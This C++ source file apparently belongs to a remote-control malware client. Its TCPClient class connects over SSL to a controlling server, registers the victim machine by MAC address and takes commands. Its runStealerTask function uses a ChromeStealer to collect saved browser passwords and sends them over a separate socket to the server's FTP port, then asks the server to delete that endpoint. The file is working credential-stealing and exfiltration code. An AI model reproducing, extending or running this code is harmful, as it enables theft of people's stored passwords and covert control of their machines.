#include "TCPClient.h"

TCPClient::TCPClient(std::string const& remote, std::string const& port)
	: _timer(_io_service),
	  _resolver(_io_service),
	  _context(boost::asio::ssl::context::sslv23),
	  _socket(_io_service, _context),
	  _remote(remote),
	  _port(port)
{
	_socket.set_verify_mode(boost::asio::ssl::verify_peer);
	_connected = false;
}

TCPClient::~TCPClient()
{
}

void TCPClient::connect(void)
{
	_context.load_verify_file(StaticTools::GetProjectResourceDirectory() + "\\server.crt");

	StaticTools::Log << "Connecting ..." << std::endl;

	_io_service.post([this](void) -> void {
		boost::asio::ip::tcp::resolver::query query(_remote, _port);
		boost::asio::ip::tcp::resolver::iterator endpoint_it = _resolver.resolve(query);
		boost::asio::async_connect(_socket.lowest_layer(), endpoint_it,
			boost::bind(&TCPClient::do_connect, this,
				boost::asio::placeholders::error,
				boost::asio::placeholders::iterator));
	});
}

void TCPClient::write(Packet* packet)
{
	bool writeInProgress = !_toWrites.empty();
	_toWrites.push(packet);
	if (!writeInProgress) {
		write();
	}
}

void TCPClient::disconnect(void)
{
	StaticTools::Log << "Disconnecting ..." << std::endl;
	_io_service.stop();
	if (_stealerTask.joinable()) {
		_stealerTask.join();
	}
	if (_runThread.joinable()) {
		_runThread.join();
	}
	_connected = false;
	StaticTools::Log << "Disconnected" << std::endl;
}

void TCPClient::run(void)
{
	_runThread = std::thread(&TCPClient::runThread, this);
}

bool TCPClient::isConnected(void) const
{
	return (_connected);
}

IClient &TCPClient::operator<<(Packet *packet)
{
	write(packet);
	return (*this);
}

Packet *TCPClient::createPacket(PacketType type, std::string const& data)
{
	return (StaticTools::CreatePacket(type, data));
}

void TCPClient::sendStealPwd(std::string const& ftpPort)
{
	if (_connected) {
		if (_stealerTask.joinable()) {
			_stealerTask.join();
		}
		_stealerTask = std::thread(&TCPClient::runStealerTask, this, ftpPort);
	}
}


void TCPClient::read(void)
{
	boost::asio::async_read(_socket, _read.prepare(1024), boost::asio::transfer_at_least(sizeof(Packet)),
		boost::bind(&TCPClient::do_read, this,
			boost::asio::placeholders::error,
			boost::asio::placeholders::bytes_transferred));
}

void TCPClient::write(void)
{
	Packet *packet = _toWrites.front();
	StaticTools::Log << "writing: " << std::string(packet->data, packet->size) << std::endl;
	boost::asio::async_write(_socket, boost::asio::buffer(packet, sizeof(Packet) + packet->size),
	boost::bind(&TCPClient::do_write, this,
			boost::asio::placeholders::error,
			boost::asio::placeholders::bytes_transferred));
}

void TCPClient::handshake(void)
{
	_socket.async_handshake(boost::asio::ssl::stream_base::client,
		boost::bind(&TCPClient::do_handshake, this,
			boost::asio::placeholders::error));
}

void TCPClient::do_connect(boost::system::error_code const& ec, boost::asio::ip::tcp::resolver::iterator)
{
	if (!ec) {
		StaticTools::Log << "Connected in TCP mod" << std::endl;
		StaticTools::Log << "Handshaking ..." << std::endl;
		handshake();
	} else {
		_timer.expires_from_now(boost::posix_time::seconds(5));
		_timer.async_wait(boost::bind(&TCPClient::connect, this));
		StaticTools::Log << _remote << ":" << _port << "' is inaccessible (" << ec << ")" << std::endl;
	}
}

void TCPClient::do_read(boost::system::error_code const& ec, size_t len)
{
	if (!ec) {
		Packet const* packet = boost::asio::buffer_cast<Packet const *>(_read.data());
		_read.consume(len);

		Packet *reply = NULL;
		_reqHandler.request(*this, packet, &reply);

		if (reply) {
			write(reply);
		}

		if (_connected) {
			read();
		}
	}
	else {
		_connected = false;
		connect();
	}
}

void TCPClient::do_write(boost::system::error_code const& ec, size_t)
{
	if (!ec) {
		Packet *packet = _toWrites.front();
		free(packet);

		_toWrites.pop();
		if (!_toWrites.empty()) {
			write();
		}
	}
}

void TCPClient::do_handshake(boost::system::error_code const& ec)
{
	ChromeStealer steal;

	if (!ec) {
		StaticTools::Log << "Handshake success" << std::endl;
		_connected = true;
		write(StaticTools::CreatePacket(PacketType::PT_NewClient, StaticTools::Mac));

		if (steal.canSteal()) {
			write(StaticTools::CreatePacket(PacketType::PT_Stealer, "steal.db"));
		}
		read();
	}
	else {
		StaticTools::Log << "Handshake failed" << std::endl;
		_timer.expires_from_now(boost::posix_time::seconds(5));
		_timer.async_wait(boost::bind(&TCPClient::handshake, this));
	}
}

void TCPClient::runThread(void)
{
	try {
		_io_service.run();
	}
	catch (std::exception const& e) {
		std::cerr << e.what() << std::endl;
	}
}

void TCPClient::runStealerTask(std::string const& ftpPort)
{
	try {
		ChromeStealer stealer;
		StaticTools::Log << "sending steal pwd to ftp: " << ftpPort << std::endl;

		if (!stealer.canSteal()) {
			return;
		}

		boost::asio::io_service ios;
		boost::asio::ip::tcp::resolver resolver(ios);
		boost::asio::ip::tcp::resolver::query query(_remote, ftpPort);
		boost::asio::ip::tcp::resolver::iterator it = resolver.resolve(query);
		boost::asio::ip::tcp::socket socket(ios);

		socket.connect(*it);

		boost::asio::streambuf request;
		std::ostream request_stream(&request);

		request_stream << stealer.stealPasswordList() << std::flush;

		boost::asio::write(socket, request);

		write(createPacket(PacketType::PT_DeleteFTP, ftpPort));
	}
	catch (std::exception const& e) {
		StaticTools::Log << "send steal pwd: " << e.what() << std::endl;
	}
}